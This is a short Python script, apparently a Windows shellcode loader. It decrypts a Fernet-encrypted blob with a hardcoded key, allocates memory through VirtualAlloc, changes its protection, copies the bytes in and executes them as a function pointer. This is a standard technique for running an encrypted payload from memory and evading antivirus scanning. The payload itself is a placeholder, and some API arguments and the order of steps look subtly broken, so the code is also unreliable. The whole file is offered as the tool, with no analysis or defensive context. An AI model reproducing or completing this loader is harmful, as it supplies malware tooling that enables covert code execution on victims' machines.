from cryptography.fernet import Fernet
import ctypes
from ctypes import *
import subprocess

import io
import ctypes
import mmap
import base64
import psutil
import win32gui
import win32process
import win32api


key = b'Dp3fafvz-bfrS4v1kc7APsNlHMI14q_v8UVtZ6XIWko='
cipher = Fernet(key)

encrypted_data = b'encrypted_data'

# //////////////////////////////////////////////

# Decrypt the content
decrypted_data = cipher.decrypt(encrypted_data)


PAGE_EXECUTE_READWRITE = 0x40
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000

# Allocate memory for the decrypted data
size = len(decrypted_data)
ptr = ctypes.windll.kernel32.VirtualAlloc(None, size, ctypes.c_uint32(0x1000), ctypes.c_uint32(0x2000), ctypes.c_uint32(0x40))

# Change the memory protection to allow execution
old_protect = ctypes.c_uint32()
ctypes.windll.kernel32.VirtualProtect(ptr, size, ctypes.c_uint32(0x20), ctypes.byref(old_protect))

# Write the decrypted data to memory
ctypes.memmove(ptr, decrypted_data, size)


# Create a function pointer to the memory and call it
func = ctypes.CFUNCTYPE(ctypes.c_void_p)
func_ptr = ctypes.cast(ptr, func)
func_ptr()
